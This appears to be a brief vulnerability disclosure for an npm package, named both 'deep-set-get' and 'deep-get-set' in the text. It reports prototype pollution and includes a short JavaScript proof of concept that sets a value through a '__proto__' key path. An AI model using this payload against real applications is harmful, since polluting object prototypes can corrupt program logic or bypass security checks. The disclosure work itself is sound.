# Description
```deep-set-get``` is a Set and get values on objects via dot-notation strings. 
This package is vulnerable to prototype pollution. 

# POC
```
const deep = require('deep-get-set');
deep({},['__proto__','polluted'],true);
console.log(polluted);
```